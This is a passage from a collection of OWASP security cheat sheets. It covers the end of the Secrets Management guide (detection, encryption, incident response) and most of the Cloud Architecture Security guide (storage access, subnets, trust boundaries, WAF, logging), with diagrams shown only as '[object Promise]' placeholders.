in logs or system dumps. Using environment variables is therefore not recommended unless the other methods are not possible.\r\n\r\n### 5.2 Short Lived Side-car Containers\r\n\r\nTo inject secrets, you could create short-lived sidecar containers that fetch secrets from some remote endpoint and then store them on a shared volume mounted to the original container. The original container can now use the secrets from mounted volume. The benefit of using this approach is that we don't need to integrate any third-party tool or code to get secrets. Once the sidecar has fetched the secrets, it terminates. Examples of this inclue [Vault Agent Sidecar Injector](https://developer.hashicorp.com/vault/docs/platform/k8s/injector) and [Conjur Secrets Provider](https://github.com/cyberark/secrets-provider-for-k8s). By mounting secrets to a volume shared with the pod, containers within the pod can consume secrets without being aware of the secrets manager.\r\n\r\n### 5.3 Internal vs External Access\r\n\r\nYou should only expose secrets to communication mechanisms between the container and the deployment representation (e.g. a Kubernetes Pod). Never expose secrets through external access mechanisms shared among deployments or orchestrators (e.g. a shared volume).\r\n\r\nWhen the orchestrator stores secrets (e.g. Kubernetes Secrets), make sure that the storage backend of the orchestrator is encrypted and you manage the keys well. See the [Kubernetes Security Cheat Sheet](Kubernetes_Security_Cheat_Sheet.md) for more information.\r\n\r\n## 6 Implementation Guidance\r\n\r\nIn this section, we will discuss implementation. Note that it is always best to refer to the official documentation of the secrets management system of choice for the actual implementation as it will be more up to date than any secondary document such as this cheat sheet.\r\n\r\n### 6.1 Key Material Management Policies\r\n\r\nKey material management is discussed in the [Key Management Cheat Sheet](Key_Management_Cheat_Sheet.md)\r\n\r\n### 6.2 Dynamic vs Static Use Cases\r\n\r\nWe see the following use cases for dynamic secrets, amongst others:\r\n\r\n- short-lived secrets (e.g. credentials or API keys) for a secondary service that expresses the intent for connecting the primary service (e.g. consumer) to the service.\r\n- short-lived integrity and encryption controls for guarding and securing in-memory and runtime communication processes. Think of encryption keys that only need to live for a single session or a single deployment lifetime.\r\n- short-lived credentials for building a stack during the deployment of a service for interacting with the deployers and supporting infrastructure.\r\n\r\nNote that these dynamic secrets often need to be created with the service we need to connect to. To create these types of dynamic secrets, we usually require long term static secrets to create the dynamic secrets themselves. Other static use cases:\r\n\r\n- key material that needs to live longer than a single deployment due to the nature of their usage in the interaction with other instances of the same service (e.g. storage encryption keys, TLS PKI keys)\r\n- key material or credentials to connect to services that do not support creating temporal roles or credentials.\r\n\r\n### 6.3 Ensure limitations are in place\r\n\r\nSecrets should never be retrievable by everyone and everything. Always make sure that you put guardrails in place:\r\n\r\n- Do you have the opportunity to create access policies? Ensure that there are policies in place to limit the number of entities that can read or write the secret. At the same time, write the policies so that you can easily extend them, and they are not too complicated to understand.\r\n- Is there no way to reduce access to certain secrets within a secrets management solution? Consider separating the production and development secrets by having separate secret management solutions. Then, reduce access to the production secrets management solution.\r\n\r\n### 6.4 Security Event Monitoring is Key\r\n\r\nContinually monitor who/what, from which IP, and what methodology accesses the secret. There are various patterns where you need to look out for, such as, but not limited to:\r\n\r\n- Monitor who accesses the secret at the secret management system: is this normal behavior? If the CI/CD credentials are used to access the secret management solution from a different IP than where the CI/CD system is running, provide a security alert and assume the secret compromised.\r\n- Monitor the service requiring the secret (if possible), e.g., whether the user of the secret is coming from an expected IP, with an expected user agent. If not, alert and assume the secret is compromised.\r\n\r\n### 6.5 Usability\r\n\r\nEnsure that your secrets management solution is easy to use, as you do not want people to work around it or use it ineffectively due to complexity. This usability requires:\r\n\r\n- Easy onboarding of new secrets and removal of invalidated secrets.\r\n- Easy integration with the existing software: it should be easy to integrate applications as consumers of the secret management system. For instance, an SDK or simple sidecar container should be available to communicate with the secret management system so that existing software is decoupled and does not need extensive modification. You can find examples of this in the AWS, Google, and Azure SDKs. These SDKs allow an application to interact with the respective secrets management solutions. You can find similar examples in the HashiCorp Vault software integrations and the [Vault Agent Sidecar Injector](https://developer.hashicorp.com/vault/docs/platform/k8s/injector), as well as Conjur integrations and [Conjur Secrets Provider](https://github.com/cyberark/secrets-provider-for-k8s).\r\n- A clear understanding of the organization of secrets management and its processes is essential.\r\n\r\n## 7 Encryption\r\n\r\nSecrets Management goes hand in hand with encryption. After all, secrets must be stored encrypted somewhere to protect their confidentiality and integrity.\r\n\r\n### 7.1 Encryption Types to Use\r\n\r\nYou can use various encryption types to secure a secret as long as they provide sufficient security, including adequate resistance against quantum computing-based attacks. Given that this is a moving field, it is best to take a look at sources like [keylength.com](https://www.keylength.com/en/4/), which enumerate up to date recommendations on the usage of encryption types and key lengths for existing standards, as well as the NSA's [Commercial National Security Algorithm Suite 2.0](https://media.defense.gov/2022/Sep/07/2003071834/-1/-1/0/CSA_CNSA_2.0_ALGORITHMS_.PDF) which enumerates quantum resistant algorithms.\r\n\r\nPlease note that in all cases, we need to preferably select an algorithm that provides encryption and confidentiality at the same time, such as AES-256 using GCM [(Gallois Counter Mode)](https://en.wikipedia.org/wiki/Galois/Counter_Mode), or a mixture of ChaCha20 and Poly1305 according to the best practices in the field.\r\n\r\n### 7.2 Convergent Encryption\r\n\r\n[Convergent Encryption](https://en.wikipedia.org/wiki/Convergent_encryption) ensures that a given plaintext and its key results in the same ciphertext. This can help detect possible re-use of secrets, resulting in the same ciphertext.\r\nThe challenge with enabling convergent encryption is that it allows attackers to use the system to generate a set of cryptographic strings that might end up in the same secret, allowing the attacker to derive the plain text secret. Given the algorithm and key, you can mitigate this risk if the convergent crypto system you use has sufficient resource challenges during encryption. Another factor that can help reduce the risk is ensuring that a secret is of adequate length, further hampering the possible guess-iteration time required.\r\n\r\n### 7.3 Where to store the Encryption Keys?\r\n\r\nYou should not store keys next to the secrets they encrypt, except if those keys are encrypted themselves (see envelope encryption). Start by consulting the [Key Management Cheat Sheet](Key_Management_Cheat_Sheet.md) on where and how to store the encryption and possible HMAC keys.\r\n\r\n### 7.4 Encryption as a Service (EaaS)\r\n\r\nEaaS is a model in which users subscribe to a cloud-based encryption service without having to install encryption on their own systems. Using EaaS, you can get the following benefits:\r\n\r\n- Encryption at rest\r\n- Encryption in transit (TLS)\r\n- Key handling and cryptographic implementations are taken care of by Encryption Service, not by developers\r\n- The provider could add more services to interact with the sensitive data\r\n\r\n## 8 Detection\r\n\r\nThere are many approaches to secrets detection and some very useful open source projects to help with this. The [Yelp Detect Secrets](https://github.com/Yelp/detect-secrets) project is mature and has signature matching for around 20 secrets. For more information on other tools to help you in the detection space, check out the [Secrets Detection](https://github.com/topics/secrets-detection) topic on GitHub.\r\n\r\n### 8.1 General detection approaches\r\n\r\nShift-left and DevSecOps principles apply to secrets detection as well. These general approaches below aim to consider secrets earlier and evolve the practice over time.\r\n\r\n- Create standard test secrets and use them universally across the organization. This allows for reducing false positives by only needing to track a single test secret for each secret type.\r\n- Consider enabling secrets detection at the developer level to avoid checking secrets into code before commit/PR either in the IDE, as part of test-driven development, or via pre-commit hook.\r\n- Make secrets detection part of the threat model. Consider secrets as part of the attack surface during threat modeling exercises.\r\n- Evaluate detection utilities and related signatures often to ensure they meet expectations.\r\n- Consider having more than one detection utility and correlating/de-duping results to identify potential areas of detection weakness.\r\n- Explore a balance between entropy and ease of detection. Secrets with consistent formats are easier to detect with lower false-positive rates, but you also don't want to miss a human-created password simply because it doesn't match your detection rules.\r\n\r\n### 8.2 Types of secrets to be detected\r\n\r\nMany types of secrets exist, and you should consider signatures for each to ensure accurate detection for all. Among the more common types are:\r\n\r\n- High availability secrets (Tokens that are difficult to rotate)\r\n- Application configuration files\r\n- Connection strings\r\n- API keys\r\n- Credentials\r\n- Passwords\r\n- 2FA keys\r\n- Private keys (e.g., SSH keys)\r\n- Session tokens\r\n- Platform-specific secret types (e.g., Amazon Web Services, Google Cloud)\r\n\r\nFor more fun learning about secrets and practice rooting them out check out the [Wrong Secrets](https://owasp.org/www-project-wrongsecrets/) project.\r\n\r\n### 8.3 Detection lifecycle\r\n\r\nSecrets are like any other authorization token. They should:\r\n\r\n- Exist only for as long as necessary (rotate often)\r\n- Have a method for automatic rotation\r\n- Only be visible to those who need them (least privilege)\r\n- Be revokable (including the logging of attempt to use a revoked secret)\r\n- Never be logged (must implement either an encryption or masking approach in place to avoid logging plaintext secrets)\r\n\r\nCreate detection rules for each of the stages of the secret lifecycle.\r\n\r\n### 8.4 Documentation for how to detect secrets\r\n\r\nCreate documentation and update it regularly to inform the developer community on procedures and systems available at your organization and what types of secrets management you expect, how to test for secrets, and what to do in event of detected secrets.\r\n\r\nDocumentation should:\r\n\r\n- Exist and be updated often, especially in response to an incident\r\n- Include the following information:\r\n    - Who has access to the secret\r\n    - How it gets rotated\r\n    - Any upstream or downstream dependencies that could potentially be broken during secret rotation\r\n    - Who is the point of contact during an incident\r\n    - Security impact of exposure\r\n\r\n- Identify when secrets may be handled differently depending on the threat risk, data classification, etc.\r\n\r\n## 9 Incident Response\r\n\r\nQuick response in the event of a secret exposure is perhaps one of the most critical considerations for secrets management.\r\n\r\n### 9.1 Documentation\r\n\r\nIncident response in the event of secret exposure should ensure that everyone in the chain of custody is aware and understands how to respond. This includes application creators (every member of a development team), information security, and technology leadership.\r\n\r\nDocumentation must include:\r\n\r\n- How to test for secrets and secrets handling, especially during business continuity reviews.\r\n- Whom to alert when a secret is detected.\r\n- Steps to take for containment\r\n- Information to log during the event\r\n\r\n### 9.2 Remediation\r\n\r\nThe primary goal of incident response is rapid response and containment.\r\n\r\nContainment should follow these procedures:\r\n\r\n1. Revocation: Keys that were exposed should undergo immediate revocation. The secret must be able to be de-authorized quickly, and systems must be in place to identify the revocation status.\r\n2. Rotation: A new secret must be able to be quickly created and implemented, preferably via an automated process to ensure repeatability, low rate of implementation error, and least-privilege (not directly human-readable).\r\n3. Deletion: Secrets revoked/rotated must be removed from the exposed system immediately, including secrets discovered in code or logs. Secrets in code could have commit history for the exposure squashed to before the introduction of the secret, however, this may introduce other problems as it rewrites git history and will break any other links to a given commit. If you decide to do this be aware of the consequences and plan accordingly. Secrets in logs must have a process for removing the secret while maintaining log integrity.\r\n4. Logging: Incident response teams must have access to information about the lifecycle of a secret to aid in containment and remediation, including:\r\n    - Who had access?\r\n    - When did they use it?\r\n    - When was it previously rotated?\r\n\r\n### 9.3 Logging\r\n\r\nAdditional considerations for logging of secrets usage should include:\r\n\r\n- Logging for incident response should be to a single location accessible by incident response (IR) teams\r\n- Ensure fidelity of logging information during purple team exercises such as:\r\n    - What should have been logged?\r\n    - What was actually logged?\r\n    - Do we have adequate alerts in place to ensure this?\r\n\r\nConsider using a standardized logging format and vocabulary such as the [Logging Vocabulary Cheat Sheet](Logging_Vocabulary_Cheat_Sheet.md) to ensure that all necessary information is logged.\r\n\r\n## 10 Related Cheat Sheets & further reading\r\n\r\n- [Key Management Cheat Sheet](Key_Management_Cheat_Sheet.md)\r\n- [Logging Cheat Sheet](Logging_Cheat_Sheet.md)\r\n- [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md)\r\n- [Cryptographic Storage Cheat Sheet](Cryptographic_Storage_Cheat_Sheet.md)\r\n- [OWASP WrongSecrets project](https://github.com/OWASP/wrongsecrets/)\r\n- [Blog: 10 Pointers on Secrets Management](https://xebia.com/blog/secure-deployment-10-pointers-on-secrets-management/)\r\n- [Blog: From build to run: pointers on secure deployment](https://xebia.com/from-build-to-run-pointers-on-secure-deployment/)\r\n- [Github listing on secrets detection tools](https://github.com/topics/secrets-detection)\r\n- [OpenCRE References to secrets](https://www.opencre.org/search/secret)\r\n- [NIST SP 800-57 Recommendation for Key Management](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)\r\n"
    },
    {
      "Secure_Cloud_Architecture_Cheat_Sheet.md": "# Cloud Architecture Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet will discuss common and necessary security patterns to follow when creating and reviewing cloud architectures. Each section will cover a specific security guideline or cloud design decision to consider. This sheet is written for a medium to large scale enterprise system, so additional overhead elements will be discussed, which may be unecessary for smaller organizations.\r\n\r\n## Risk Analysis, Threat Modeling, and Attack Surface Assessments\r\n\r\nWith any application architecture, understanding the risks and threats is extremely important for proper security. No one can spend their entire budget or bandwidth focused on security, so properly allocating security resources is necessary.\r\nTherefore, enterprises must perform risk assessments, threat modeling activites, and attack surface assessments to identify the following:\r\n\r\n- What threats an application might face\r\n- The likelihood of those threats actualizing as attacks\r\n- The attack surface with which those attacks could be targeted\r\n- The business impact of losing data or functionality due to said attack\r\n\r\nThis is all necessary to properly scope the security of an architecture. However, these are subjects that can/should be discussed in greater detail. Use the resources link below to investigate further as part of a healthy secure architecture conversation.\r\n\r\n- [Threat Modeling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html)\r\n- [Attack Surface Analysis Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html)\r\n- [CISA Cyber Risk Assessment](https://www.cisa.gov/sites/default/files/2023-02/22_1201_safecom_guide_to_cybersecurity_risk_assessment_508-r1.pdf)\r\n\r\n## Public and Private Components\r\n\r\n### Secure Object Storage\r\n\r\nObject storage usually has the following options for accessing data:\r\n\r\n- Accessing resources using built-in Identity and Access Management policies\r\n- Using cryptographically signed URLs and HTTP requests\r\n- Directly accessing with public storage\r\n\r\n#### IAM Access\r\n\r\nThis method involves indirect access on tooling such as a managed or self-managed service running on ephemeral or persistent infrastructure. This infrastructure contains a persistent control plane IAM credential, which interacts with the object storage on the user's behalf. The method is best used when the application has other user interfaces or data systems available, when it is important to hide as much of the storage system as possible, or when the information shouldn't/won't be seen by an end user (metadata). It can be used in combination with web authentication and logging to better track and control access to resources. The key security concern for this approach is relying on developed code or policies which could contain weaknesses.\r\n\r\n|                 Pros                 |                       Cons                         |\r\n|:------------------------------------:|:--------------------------------------------------:|\r\n|       No direct access to data       |          Potential use of broad IAM policy         |\r\n| No user visibility to object storage | Credential loss gives access to control plane APIs |\r\n|   Identifiable and loggable access   |           Credentials could be hardcoded           |\r\n\r\nThis approach is acceptable for sensitive user data, but must follow rigorous coding and cloud best practices, in order to properly secure data.\r\n\r\n#### Signed URLs\r\n\r\nURL Signing for object storage involves using some method or either statically or dynamically generating URLs, which cryptographically guarantee that an entity can access a resource in storage. This is best used when direct access to specific user files is necessary or preferred, as there is no file transfer overhead. It is advisable to only use this method for user data which is not very sensitive. This method can be secure, but has notable cons. Code injection may still be possible if the method of signed URL generation is custom, dynamic and injectable, and anyone can access the resource anonymously, if given the URL. Developers must also consider if and when the signed URL should expire, adding to the complexity of the approach.\r\n\r\n|                    Pros                   |                    Cons                   |\r\n|:-----------------------------------------:|:-----------------------------------------:|\r\n|        Access to only one resource        |              Anonymous Access             |\r\n| Minimal user visibility to object storage |         Anyone can access with URL        |\r\n|           Efficient file transfer         | Possibility of injection with custom code |\r\n\r\n#### Public Object Storage\r\n\r\n**This is not an advisable method for resource storage and distribution**, and should only be used for public, non-sensitive, generic resources. This storage approach will provide threat actors additional reconnaissance into a cloud environment, and any data which is stored in this configuration for any period of time must be considered publicly accessed (leaked to the public).\r\n\r\n|                 Pros                |                 Cons                 |\r\n|:-----------------------------------:|:------------------------------------:|\r\n| Efficient access to many resources  |     Anyone can access/No privacy     |\r\n|       Simple public file share      |  Unauthenticated access to objects   |\r\n|                                     |  Visibility into full file system    |\r\n|                                     |     Accidently leak stored info      |\r\n\r\n### VPCs and Subnets\r\n\r\nVirtual Private Clouds (VPC) and public/private network subnets allow an application and its network to be segmented into distinct chunks, adding layers of security within a cloud system. Unlike other private vs public trade-offs, an application will likely incorporate most or all of these components in a mature architecture. Each is explained below.\r\n\r\n#### VPCs\r\n\r\nVPC's are used to create network boundaries within an application, where-in components can talk to each other, much like a physical network in a data center. The VPC will be made up of some number of subnets, both public and private. VPCs can be used to:\r\n\r\n- Separate entire applications within the same cloud account.\r\n- Separate large components of application into distinct VPCs with isolated networks.\r\n- Create separations between duplicate applications used for different customers or data sets.\r\n  \r\n#### Public Subnets\r\n\r\nPublic subnets house components which will have an internet facing presence. The subnet will contain network routing elements to allow components within the subnet to connect directly to the internet. Some use cases include:\r\n\r\n- Public facing resources, like front-end web applications.\r\n- Initial touch points for applications, like load balancers and routers.\r\n- Developer access points, like [bastions](https://aws-quickstart.github.io/quickstart-linux-bastion/) (note, these can be very insecure if engineered/deployed incorrectly).\r\n\r\n#### Private Subnets\r\n\r\nPrivate subnets house components which should not have direct internet access. The subnet will likely contain network routing to connect it to public subnets, to receive internet traffic in a structured and protected way. Private subnets are great for:\r\n\r\n- Databases and data stores.\r\n- Backend servers and associated file systems.\r\n- Anything deemed too sensitive for direct internet access.\r\n\r\n#### Simple Architecture Example\r\n\r\nConsider the simple architecture diagram below. A VPC will house all of the components for the application, but elements will be in a specific subnet depending on its role within the system. The normal flow for interacting with this application might look like:\r\n\r\n1. Accessing the application through some sort of internet gateway, API gateway or other internet facing component.\r\n2. This gateway connects to a load balancer or a web server in a public subnet. Both components provide public facing functions and are secured accordingly.\r\n3. These components then interact with their appropriate backend counterparts, a database or backend server, contained in a private VPC. This connections are more limited, preventing extraneous access to the possibly \"soft\" backend systems.\r\n\r\n[object Promise]\r\n\r\n*Note: This diagram intentionally skips routing and IAM elements for subnet interfacing, for simplicity and to be service provider agnostic.*\r\n\r\nThis architecture prevents less hardened backend components or higher risk services like databases from being exposed to the internet directly. It also provides common, public functionality access to the internet to avoid additional routing overhead. This architecture can be secured more easily by focusing on security at the entry points and separating functionality, putting non-public or sensitive information inside a private subnet where it will be harder to access by external parties.\r\n\r\n## Trust Boundaries\r\n\r\nTrust boundaries are connections between components within a system where a trust decision has to be made by the components. Another way to phrase it, this boundary is a point where two components with potentially different trust levels meet. These boundaries can range in scale, from the degrees of trust given to users interacting with an application, to trusting or verifying specific claims between code functions or components within a cloud architecture. Generally speaking however, trusting each component to perform its function correctly and securely, suffices. Therefore, trust boundaries likely will occur in the connections between cloud components, and between the application and third party elements, like end users and other vendors.  \r\n\r\nAs an example, consider the architecture below. An API gateway connects to a compute instance (ephemeral or persistent), which then accesses a persistent storage resource. Separately, there exists a server which can verify the authentication, authorization and/or identity of the caller. This is a generic representation of an OAuth, IAM or directory system, which controls access to these resources. Additionally, there exists an Ephemeral IAM server which controls access for the stored resources (using an approach like the [IAM Access](#iam-access) section above). As shown by the dotted lines, trust boundaries exist between each compute component, the API gateway and the auth/identity server, even though many or all of the elements could be in the same application.\r\n\r\n[object Promise]\r\n\r\n### Exploring Different Levels of Trust\r\n\r\nArchitects have to select a trust configuration between components, using quantative factors like risk score/tolerance, velocity of project, as well as subjective security goals. Each example below details trust boundary relationships to better explain the implications of trusting a certain resource. The threat level of a specific resource as a color from green (safe) to red (dangerous) will outline which resources shouldn't be trusted.\r\n\r\n#### 1. No trust example\r\n\r\nAs shown in the diagram below, this example outlines a model where no component trusts any other component, regardless of criticality or threat level. This type of trust configuration would likely be used for incredibly high risk applications, where either very personal data or important business data is contained, or where the application as a whole has an extremely high business criticality.\r\n\r\nNotice that both the API gateway and compute components call out to the auth/identity server. This implies that no data passing between these components, even when right next to each other \"inside\" the application, is considered trusted. The compute instance must then assume an ephemeral identity to access the storage, as the compute instance isn't trusted to a specific resource even if the user is trusted to the instance.\r\n\r\nAlso note the lack of trust between the auth/identity server and ephemeral IAM server and each component. While not displayed in the diagram, this would have additional impacts, like more rigorous checks before authentication, and possibly more overhead dedicated to cryptographic operations.\r\n\r\n[object Promise]\r\n\r\nThis could be a necessary approach for applications found in financial, military or critical infrastructure systems. However, security must be careful when advocating for this model, as it will have significant performance and maintenance drawbacks.\r\n\r\n|              Pros                |         Cons          |\r\n|:--------------------------------:|:---------------------:|\r\n| High assurance of data integrity | Slow and inefficient  |\r\n|         Defense in depth         |      Complicated      |\r\n|                                  | Likely more expensive |\r\n\r\n#### 2. High trust example\r\n\r\nNext, consider the an opposite approach, where everything is trusted. In this instance, the \"dangerous\" user input is trusted and essentially handed directly to a high criticality business component. The auth/identity resource is not used at all. In this instance, there is higher likelihood of a successful attack against the system, because there are no controls in place to prevent it. Additionally, this setup could be considered wasteful, as both the auth/identity and ephemeral IAM servers are not necessarily performing their intended function. *(These could be shared corporate resources that aren't being used to their full potential).*\r\n\r\n[object Promise]\r\n\r\nThis is an unlikely architecture for all but the simplest and lowest risk applications. **Do not use this trust boundary configuration** unless there is no sensitive content to protect or efficiency is the only metric for success. Trusting user input is never recommended, even in low risk applications.\r\n\r\n| Pros      | Cons                    |\r\n|:---------:|:-----------------------:|\r\n| Efficient |        Insecure         |\r\n|  Simple   |   Potentially Wasteful  |\r\n|           | High risk of compromise |\r\n\r\n#### 3. Some trust example\r\n\r\nMost applications will use a trust boundary configuration like this. Using knowledge from a risk and attack surface analysis, security can reasonably assign trust to low risk components or processes, and verify only when necessary. This prevents wasting valuable security resources, but also limits the complexity and efficiency loss due to additional security overhead.\r\n\r\nNotice in this example, that the API gateway checks the auth/identity of a user, then immediately passes the request on to the compute instance. The instance doesn't need to re-verify, and performs it's operation. However, as the compute instance is working with untrusted user inputs (designated yellow for some trust), it is still necessary to assume an ephemeral identity to access the storage system.\r\n\r\n[object Promise]\r\n\r\nBy nature, this approach limits the pros and cons of both previous examples. This model will likely be used for most applications, unless the benefits of the above examples are necessary to meet business requirements.\r\n\r\n|                   Pros                   |          Cons          |\r\n|:----------------------------------------:|:----------------------:|\r\n|           Secured based on risk          | Known gaps in security |\r\n| Cost/Efficiency derived from criticality |                        |\r\n\r\n*Note: This trust methodology diverges from Zero Trust. For a more in depth look at that topic, check out [CISA's Zero Trust Maturity Model](https://www.cisa.gov/sites/default/files/2023-04/zero_trust_maturity_model_v2_508.pdf)*.\r\n\r\n## Security Tooling\r\n\r\n### Web Application Firewall\r\n\r\nWeb application firewalls (WAF) are used to monitor or block common attack payloads (like [XSS](https://owasp.org/www-community/attacks/xss/) and [SQLi](https://owasp.org/www-community/attacks/SQL_Injection)), or allow only specific request types and patterns. Applications should use them as a first line of defense, attaching them to entry points like load balancers or API gateways, to handle potentially malicious content before it reaches application code. Cloud providers curate base rule sets which will block or monitor common malicious payloads:\r\n\r\n- [AWS Managed Rules](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html)\r\n- [GCP WAF Rules](https://cloud.google.com/armor/docs/waf-rules)\r\n- [Azure Core Rule Sets](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-crs-rulegroups-rules?tabs=owasp32)\r\n\r\nBy design these rule sets are generic and will not cover every attack type an application will face. Consider creating custom rules which will fit the application's specific security needs, like:\r\n\r\n- Filtering routes to acceptable endpoints (block web scraping)\r\n- Adding specific protections for chosen technologies and key application endpoints\r\n- Rate limiting sensitive APIs\r\n\r\n### Logging & Monitoring\r\n\r\nLogging and monitoring is required for a truly secure application. Developers should know exactly what is going on in their environment, making use of alerting mechanisms to warn engineers when systems are not working as expected. Additionally, in the event of a security incident, logging should be verbose enough to track a threat actor through an entire application, and provide enough knowledge for respondents to understand what actions were taken against what resources. Note that proper logging and monitoring can be expensive, and risk/cost trade-offs should be discussed when putting logging in place.\r\n\r\n#### Logging\r\n\r\nFor proper logging, consider:\r\n\r\n- Logging all [layer 7](https://en.wikipedia.org/wiki/OSI_model) HTTP calls with headers, caller metadata, and responses\r\n    - Payloads may not be logged depending on where logging occurs (before TLS termination) and the sensitivity of data\r\n- Logging internal actions with actor and permission information\r\n- Sending trace IDs through the entire request lifecycle to track errors or malicious actions\r\n- Masking or removing sensitive data\r\n    - SSNs, sensitive health information, and other PII should not be stored in logs\r\n\r\n*Legal and compliance representatives should weigh in on log retention times for the specific application.*\r\n\r\n#### Monitoring\r\n\r\nFor proper monitoring consider adding:\r\n\r\n- Anomaly alerts:\r\n    - HTTP 4xx and 5xx errors above a percent of normal\r\n    - Memory, storage or CPU usage above/below percent of normal\r\n    - Database writes/reads above/below percent of normal\r\n    - Serverless compute invocations above percent of normal\r\n- Alerting for failed health checks\r\n- Alerting for deployment errors or container on/off cycling\r\n- Alerts or cutoffs for cost limits\r\n\r\nAnomalies by count and type can vary wildly from app to app. A proper understanding of what qualifies as an anomaly requires an environment specific baseline. Therefore, the percentages mentioned above should be chosen based off that baseline, in addition to considerations like risk and team response capacity.\r\n\r\nWAFs can also have monitoring or alerting attached to them for counting malicious payloads or (in some cases) anomalous activity detection.\r\n\r\n### DDoS Protection\r\n\r\nCloud service companies offer a range of simple and advanced DDoS protection products, depending on application needs. Simple DDOS protection can often be employed using WAFs with rate limits and route blocking rules, while more advanced protection may require specific managed tooling offered by the cloud provider. Examples include:\r\n\r\n- [AWS Shield](https://aws.amazon.com/shield/)\r\n- [GCP Cloud Armor Managed Protection](https://cloud.google.com/armor/docs/managed-protection-overview)\r\n- [Azure DDoS Protection](https://learn.microsoft.com/en-us/azure/ddos-protection/ddos-protection-overview)\r\n\r\nThe decision to enable advanced DDoS protections for a specific application should be based off risk and business criticality of application, taking into account mitigating factors and cost (these services can be very inexpensive compared to large company budgets).\r\n\r\n## Shared Responsibility Model\r\n\r\nThe Shared Responsibility Model is a framework for cloud service providers (CSPs) and those selling cloud based services to properly identify and segment the responsibilities of the developer and the provider. This is broken down into different levels of control, corresponding to different elements/layers of the technology stack. Generally, components like physical computing devices and data center space are the responsibility of the CSP. Depending on the level of [management](#self-managed-tooling), the developer could be responsible for the entire stack from operating system on up, or only for some ancillary functionality, code or administration.\r\n\r\nThis responsiblitity model is often categorized into three levels of service called:\r\n\r\n- Infrastructure as a Service ([IaaS](#iaas))\r\n- Platform as a Service ([PaaS](#paas))\r\n- Software as a Service ([SaaS](#saas))\r\n\r\n*Many other service classifications exist, but aren't listed for simplicity and brevity.*\r\n\r\nAs each name indicates, the level of responsibility the CSP assumes is the level of \"service\" they provide. Each level provides its own set of pros and cons, discussed below.\r\n\r\n### IaaS\r\n\r\nIn the case of IaaS, the infrastructure is maintained by the CSP, while everything else is maintained by the developer. This includes:\r\n\r\n- Authentication and authorization\r\n- Data storage, access and management\r\n- Certain networking tasks (ports, NACLs, etc)\r\n- Application software\r\n\r\nThis model favors developer configurability and flexibility, while being more complex and generally higher cost than other service models. It also most closely resembles on premise models which are waning in favor with large companies. Because of this, it may be easier to migrate certain applications to cloud IaaS, than to re-architect with a more cloud native architecture.\r\n\r\n|             Pros             |            Cons           |\r\n|:----------------------------:|:-------------------------:|\r\n| Control over most components |        Highest cost       |\r\n|   High level of flexilibity  | More required maintenance |\r\n| Easy transition from on-prem |  High level of complexity |\r\n\r\n**Responsibility is held almost exclusively by the developer, and must be secured as such**. Everything, from network access control, operating system vulnerabilities, application vulnerabilities, data access, and authentication/authorization must be considered when developing an IaaS security strategy. Like described above, this offers a high level of control across almost everything in the technology stack, but can be very difficult to maintain without adequate resources going to tasks like version upgrades or end of life migrations. *([Self-managed security updates](#update-strategy-for-self-managed-services) are discussed in greater detail below.)*\r\n\r\n### PaaS\r\n\r\nPlatform as a Service is in the middle between IaaS and SaaS. The developer controls:\r\n\r\n- Application authentication and authorization\r\n- Application software\r\n- External data storage\r\n\r\nIt provides neatly packaged code hosting and containerized options, which allow smaller development teams or less experienced developers a way to get started with their applications while ignoring more complex or superfluous computing tasks. It is generally less expensive than IaaS, while still retaining some control over elements that a SaaS system does not provide. However, developers could have problems with the specific limitations of the offering used, or issues with compatability, as the code must work with the correct container, framework or language version.\r\n\r\nAlso, while scalability is very dependent on provider and setup, PaaS usually provides higher scalability due to containerization options and common, repeatable base OS systems. Compared to IaaS, where scalability must be built by the developer, and SaaS, where the performance is very platform specific.\r\n\r\n|              Pros              |              Cons              |\r\n|:------------------------------:|:------------------------------:|\r\n| Easier to onboard and maintain | Potential compatability issues |\r\n|       Better scalability       |  Offering specific limitations |\r\n\r\nManual security in PaaS solutions is similary less extensive (compared to IaaS). Application specific authentication and authorization must still be handled by the developer, along with any access to external data systems. However, the CSP is responsible for securing containerized instances, operating systems, ephemeral files systems, and certain networking controls.\r\n\r\n### SaaS\r\n\r\nThe Software as a Service model is identified by a nearly complete product, where the end user only has to configure or customize small details in order to meet their needs. The user generally controls:\r\n\r\n- Configuration, administration and/or code within the product's boundaries\r\n- Some user access, such as designating administrators\r\n- High level connections to other products, through permissions or integrations\r\n\r\nThe entire technology stack is controlled by the provider (cloud service or other software company), and the developer will only make relatively small tweaks to meet custom needs. This limits cost and maintenance, and problems can typically be solved with a provider's customer support, as opposed to needing technical knowledge to troubleshoot the whole tech stack.\r\n\r\n|               Pros               |                Cons                |\r\n|:--------------------------------:|:----------------------------------:|\r\n|          Low maintenance         | Restricted by provider constraints |\r\n|            Inexpensive           |           Minimal control          |\r\n| Customer support/troubleshooting |      Minimal insight/oversight     |\r\n\r\nSecurity with SaaS is simultaneously the easiest and most difficult, due to the lack of control expressed above. A developer will only have to manage a small set of security functions, like some access controls, the data trust/sharing relationship with integrations, and any security implications of customizations. All other layers of security are controlled by the provider. This means that any security fixes will be out of the developer's hands, and therefore could be handled in a untimely manner, or not to a satisfactory level of security for an end user (depending on security needs). However, such fixes won't require end user involvement and resources, making them easier from the perspective of cost and maintenance burden.\r\n\r\n*Note: When looking for SaaS solutions, consider asking for a company's attestation records and proof of compliance to standards like [ISO 27,001](https://www.iso.org/standard/27001). Listed below are links to each of the major CSPs' attestation sites for additional understanding.*\r\n\r\n- [GCP](https://cloud.google.com/security/compliance/offerings)\r\n- [AWS](https://docs.aws.amazon.com/whitepapers/latest/gxp-systems-on-aws/aws-certifications-and-attestations.html)\r\n- [Azure](https://learn.microsoft.com/en-us/azure/compliance/offerings/)\r\n\r\n### Self-managed tooling\r\n\r\nAnother way to describe this shared responsibility model more generically is by categorizing cloud tooling on a spectrum of \"management\". Fully managed services leave very little for the end developer to handle besides some coding or administrative functionality (SaaS), while self-managed systems require much more overhead to maintain (IaaS).\r\n\r\nAWS provides an excellent example of this difference in management, identifying where some of their different products fall onto different points in the spectrum.\r\n\r\n[object Promise]\r\n\r\n*Note: It is hard to indicate exactly which 